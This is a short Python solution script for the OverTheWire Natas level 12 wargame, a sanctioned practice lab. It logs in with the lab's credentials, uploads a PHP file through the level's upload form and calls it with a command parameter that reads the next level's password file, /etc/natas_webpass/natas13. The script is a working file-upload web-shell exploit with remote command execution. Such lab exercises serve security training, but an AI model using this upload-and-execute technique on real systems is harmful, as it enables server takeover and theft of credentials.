import requests
import  re


username = 'natas12'
password = 'EDXp0pS26wLKHZy1rDBPUZk0RKfLGIR3'


url = 'http://%s.natas.labs.overthewire.org/' % username


session = requests.Session()
response = session.post(url, files = { "uploadedfile" : open('natas12.php', 'rb') }, data = { "filename" : "natas12.php", "MAX_FILE_SIZE" : "1000"}, auth = (username, password) )
content = response.text
exploit_location = re.findall("The file <a href=\"(.*)\">upload", content)[0]

session2 = requests.Session()
response2 = session2.get(url + exploit_location + '?command=cat /etc/natas_webpass/natas13', auth = (username, password))

content2 = response2.text
print(content2)